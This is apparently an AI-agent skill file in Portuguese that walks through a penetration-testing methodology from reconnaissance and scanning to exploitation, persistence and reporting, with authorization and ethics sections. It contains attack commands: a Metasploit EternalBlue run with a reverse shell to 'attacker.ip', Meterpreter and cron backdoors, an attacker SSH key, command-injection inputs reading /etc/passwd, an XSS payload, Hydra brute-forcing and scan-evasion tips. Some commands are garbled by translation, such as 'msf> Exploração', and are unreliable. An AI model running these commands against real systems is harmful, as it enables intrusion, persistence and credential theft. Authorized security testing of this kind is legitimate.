--- 
name: metodologia-de-hacking-ético
description: "Domine o ciclo de vida completo de testes de penetração, do reconhecimento à elaboração de relatórios. Esta habilidade abrange as cinco etapas da metodologia de hacking ético, ferramentas essenciais, técnicas de ataque e elaboração de relatórios profissionais para avaliações de segurança autorizadas."
risk: desconhecido
source: comunidade
autor: zebbern
date_add: "27/02/2026"
---

# Metodologia de Hacking Ético

## Objetivo

Domine o ciclo de vida completo de testes de penetração, do reconhecimento à elaboração de relatórios. Esta habilidade abrange as cinco etapas da metodologia de hacking ético, ferramentas essenciais, técnicas de ataque e elaboração de relatórios profissionais para avaliações de segurança autorizadas.

## Pré-requisitos

### Ambiente Necessário
- Kali Linux instalado (persistente ou live)
- Acesso à rede para os alvos autorizados
- Autorização por escrito do proprietário do sistema

### Conhecimentos Necessários
- Conceitos básicos de redes
- Proficiência na linha de comando do Linux
- Compreensão de tecnologias web
- Familiaridade com conceitos de segurança

## Resultados e Entregáveis

1. **Relatório de Reconhecimento** - Informações sobre o alvo coletadas
2. **Avaliação de Vulnerabilidades** - Vulnerabilidades identificadas
3. **Evidências de Exploração** - Ataques de prova de conceito
4. **Relatório Final** - Resultados executivos e técnicos

## Fluxo de Trabalho Principal

### Fase 1: Compreendendo os Tipos de Hackers

Classificação de profissionais de segurança:

**Hackers de Chapéu Branco (Hackers Éticos)**
- Profissionais de segurança autorizados
- Realizam testes de penetração com permissão
- Objetivo: Identificar e corrigir vulnerabilidades
- Também conhecidos como: testadores de penetração, consultores de segurança

**Hackers de Chapéu Preto** **Maliciosos**
- Intrusões não autorizadas no sistema
- Motivados por lucro, vingança ou notoriedade
- Objetivo: Roubar dados, causar danos
- Também conhecidos como: crackers, hackers criminosos

**Hackers de Chapéu Cinza (Híbridos)**
- Podem ultrapassar limites éticos
- Não são maliciosos, mas podem infringir regras
- Frequentemente divulgam vulnerabilidades publicamente
- Motivações mistas

**Outras Classificações**

- **Script Kiddies**: Usam ferramentas pré-fabricadas sem conhecimento
- **Hacktivistas**: Motivados política ou socialmente
- **Agentes de Estado-Nação**: Operativos patrocinados pelo governo
- **Programadores**: Desenvolvem ferramentas e exploits

### Fase 2: Reconhecimento

Coletar informações sem interação direta com o sistema:

**Reconhecimento Passivo**
```bash
# Consulta WHOIS
whois target.com

# Enumeração DNS
nslookup target.com
dig target.com ANY
dig target.com MX
dig target.com NS

# Descoberta de subdomínios
dnsrecon -d target.com

# Coleta de e-mails
theHarvester -d target.com -b all
```

**Google Hacking (OSINT)**

```
# Encontrar arquivos expostos
site:target.com filetype:pdf
site:target.com filetype:xls
site:target.com filetype:doc

# Encontrar páginas de login
site:target.com inurl:login
site:target.com inurl:admin

# Encontrar listagens de diretórios
site:target.com intitle:"index of"

# Encontrar arquivos de configuração
site:target.com filetype:config
site:target.com filetype:env
```

**Categorias do Banco de Dados de Google Hacking:**
- Arquivos contendo senhas
- Diretórios sensíveis
- Detecção de servidores web
- Servidores vulneráveis
- Mensagens de erro
- Portais de login

**Reconhecimento de mídias sociais**
- LinkedIn: Organizacional Gráficos, tecnologias utilizadas
- Twitter: Anúncios da empresa, informações sobre funcionários
- Facebook: Informações pessoais, relacionamentos
- Anúncios de vagas de emprego: Revelações sobre a pilha de tecnologias

### Fase 3: Varredura

Enumeração ativa de sistemas alvo:

**Descoberta de Hosts**
```bash
# Varredura de ping
nmap -sn 192.168.1.0/24

# Varredura ARP (rede local)
arp-scan -l

# Descobrir hosts ativos
nmap -sP 192.168.1.0/24
```

**Varredura de Portas**
```bash
# Varredura TCP SYN (furtiva)
nmap -sS target.com

# Varredura completa de conexões TCP
nmap -sT target.com

# Varredura UDP
nmap -sU target.com

# Varredura de todas as portas
nmap -p- target.com

# 1000 portas principais com detecção de serviço
nmap -sV target.com

# Varredura agressiva (SO, versão, scripts)
nmap -A target.com
```

**Enumeração de Serviços**
```bash
# Scripts de serviço específicos
nmap --script=http-enum target.com
nmap --script=smb-enum-shares target.com
nmap --script=ftp-anon target.com

# Varredura de vulnerabilidades
nmap --script=vuln target.com
```

**Referência de Portas Comuns**
| Porta | Serviço | Observações |

|------|---------|-------|
| 21 | FTP | Transferência de arquivos |

| 22 | SSH | Shell seguro |

| 23 | Telnet | Acesso remoto não criptografado |

| 25 | SMTP | E-mail |

| 53 | DNS | Resolução de nomes |

| 80 | HTTP | Web |

| 443 | HTTPS | Web segura |

| 445 | SMB | Compartilhamento do Windows |

| 3306 | MySQL | Banco de dados |

| 3389 | RDP | Área de trabalho remota |

### Fase 4: Análise de Vulnerabilidades

Identificar fraquezas exploráveis:

**Varredura Automatizada**
```bash
# Nikto web scanner
nikto -h http://target.com

# OpenVAS (linha de comando)
omp -u admin -w password --xml="<get_tasks/>"

# Nessus (via API)
nessuscli scan --target target.com
```

**Teste de Aplicação Web (OWASP)**
- Injeção de SQL
- Cross-Site Scripting (XSS)
- Autenticação Falha
- Configuração de Segurança Incorreta
- Exposição de Dados Sensíveis
- Entidades Externas XML (XXE)
- Controle de Acesso Falho
- Desserialização Insegura
- Uso de Componentes com Vulnerabilidades Conhecidas
- Registro e Monitoramento Insuficientes

**Técnicas Manuais**
```bash
# Força bruta de diretórios
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt

# Enumeração de subdomínios
gobuster dns -d target.com -w /usr/share/wordlists/subdomains.txt

# Identificação de tecnologias web
whatweb target.com
```

### Fase 5: Exploração

Explorar ativamente as vulnerabilidades descobertas:

**Metasploit Framework**
```bash
# Iniciar o Metasploit
msfconsole

# Buscar exploits
msf> search type:exploit name:smb

# Usar um exploit específico
msf> use exploit/windows/smb/ms17_010_eternalblue

# Definir alvo
msf> set RHOSTS target.com

# Definir payload
msf> set PAYLOAD windows/meterpreter/reverse_tcp
msf> set LHOST attacker.ip

# Executar
msf> Exploração
```

**Ataques de Senha**
```bash
# Força bruta com Hydra
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://target.com
hydra -L users.txt -P passwords.txt ftp://target.com

# John the Ripper
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```

**Exploração Web**
```bash
# SQLMap para injeção de SQL
sqlmap -u "http://target.com/page.php?id=1" --dbs
sqlmap -u "http://target.com/page.php?id=1" -D database --tables

# Teste de XSS
# Manual: <script>alert('XSS')</script>

# Teste de injeção de comando
# ; ls -la
# | cat /etc/passwd
```

### Fase 6: Manutenção de Acesso

Estabelecer acesso persistente:

**Backdoors**
```bash
# Persistência com Meterpreter
meterpreter> run persistence -X -i 30 -p 4444 -r attacker.ip

# Persistência com chave SSH
# Adicionar a chave pública do atacante em ~/.ssh/authorized_keys

# Persistência com tarefa cron
echo "* * * * * /tmp/backdoor.sh" >> /etc/crontab
```

**Escalonamento de Privilégios**
```bash
# Enumeração no Linux
linpeas.sh
linux-exploit-suggester.sh

# Enumeração no Windows
winpeas.exe
windows-exploit-suggester.py

# Verificar binários SUID (Linux)
find / -perm -4000 2>/dev/null

# Verifique as permissões do sudo
sudo -l
```
**Apagando Rastros (Contexto Ético)**
- Documente todas as ações realizadas
- Mantenha registros para relatórios
- Evite alterações desnecessárias no sistema
- Limpe arquivos de teste e backdoors

### Fase 7: Relatórios

Documente as descobertas de forma profissional:

**Estrutura do Relatório**

1. **Resumo Executivo**

- Principais descobertas

- Impacto nos negócios

- Classificação de riscos

- Prioridades de remediação

2. **Descobertas Técnicas**

- Detalhes da vulnerabilidade

- Prova de conceito

- Capturas de tela/evidências

- Sistemas afetados

3. **Classificação de Riscos**

- Crítico: Ação imediata necessária

- Alto: Resolver em 24 a 48 horas

- Médio: Resolver em 1 semana

- Baixo: Resolver em 1 mês

- Informativo: Recomendações de melhores práticas

4. **Recomendações de Remediação**

- Correções específicas para cada descoberta

- Mitigações de curto prazo

- Soluções de longo prazo

- Requisitos de recursos

5. **Apêndices**

- Resultados detalhados da varredura

- Configurações das ferramentas

- Cronograma de testes

- Escopo e metodologia

### Fase 8: Tipos de Ataque Comuns

**Phishing**

- Roubo de credenciais por e-mail
- Páginas de login falsas
- Anexos maliciosos
- Componente de engenharia social

**Tipos de Malware**

- **Vírus**: Autorreplicação, necessita do arquivo hosts
- **Worm**: Autopropagação em redes
- **Trojan**: Disfarçado de software legítimo
- **Ransomware**: Criptografa arquivos para exigir resgate
- **Rootkit**: Acesso oculto em nível de sistema
- **Spyware**: Monitora a atividade do usuário

**Ataques de Rede**

- Ataque Man-in-the-Middle (MITM)

- Spoofing de ARP
- Envenenamento de DNS
- DDoS (Ataque de Negação de Serviço Distribuído)

### Fase 9: Configuração do Kali Linux

Instalar a plataforma de teste de penetração:

**Hard Instalação em Disco**
1. Baixe a ISO de kali.org
2. Inicialize a partir da mídia de instalação
3. Selecione "Instalação Gráfica"
4. Configure o idioma, o local e o teclado
5. Defina o nome do host e a senha de root
6. Particione o disco (Guiado - use o disco inteiro)
7. Instale o carregador de inicialização GRUB
8. Reinicie e faça login

**USB Live (Persistente)**
```bash
# Criar USB inicializável
dd if=kali-linux.iso of=/dev/sdb bs=512k status=progress

# Criar partição de persistência
gparted /dev/sdb
# Adicionar partição ext4 com o rótulo "persistence"

# Configurar persistência
mkdir /mnt/usb
mount /dev/sdb2 /mnt/usb
echo "/ union" > /mnt/usb/persistence.conf
umount /mnt/usb
```

### Fase 10: Ética Diretrizes

**Requisitos Legais**
- Obter autorização por escrito
- Definir o escopo claramente
- Documentar todas as atividades de teste
- Reportar todas as descobertas ao cliente
- Manter a confidencialidade

**Conduta Profissional**
- Trabalhar com ética e integridade
- Respeitar a privacidade dos dados acessados
- Evitar danos desnecessários ao sistema
- Executar somente os testes planejados
- Nunca usar as descobertas para ganho pessoal

## Referência Rápida

### Ciclo de Vida do Teste de Penetração

| Etapa | Objetivo | Ferramentas Principais |

|-------|---------|-----------|

| Reconhecimento | Coletar informações | theHarvester, WHOIS, Google |

| Varredura | Enumerar alvos | Nmap, Nikto, Gobuster |

| Exploração | Obter acesso | Metasploit, SQLMap, Hydra |

| Manutenção do Acesso | Persistência | Meterpreter, chaves SSH |

| Relatório | Documentar descobertas | Modelos de relatório |

### Comandos Essenciais

| Comando | Objetivo |

|---------|---------|
| `nmap -sV alvo` | Varredura de portas e serviços |

| `nikto -h alvo` | Varredura de vulnerabilidades web |

| `msfconsole` | Iniciar Metasploit |

| `hydra -l usuário -P lista ssh://alvo` | Ataque de força bruta SSH |

| `sqlmap -u "url?id=1" --dbs` | Injeção de SQL |

## Restrições e Limitações

### Autorização Necessária
- Nunca realize testes sem permissão por escrito
- Mantenha-se dentro do escopo definido
- Reporte tentativas de acesso não autorizado

### Padrões Profissionais
- Siga as regras de engajamento
- Mantenha a confidencialidade do cliente
- Documente a metodologia utilizada
- Forneça recomendações práticas

## Solução de Problemas

### Varreduras Bloqueadas

**Soluções:**
1. Use taxas de varredura mais lentas
2. Tente técnicas de varredura diferentes
3. Use proxy ou VPN
4. Fragmente os pacotes

### Explorações com Falha

**Soluções:**
1. Verifique se a vulnerabilidade alvo existe
2. Verifique a compatibilidade da carga útil
3. Ajuste os parâmetros da exploração
4. Tente explorações alternativas

## Quando Usar
Esta habilidade é aplicável para executar o fluxo de trabalho ou as ações descritas na visão geral.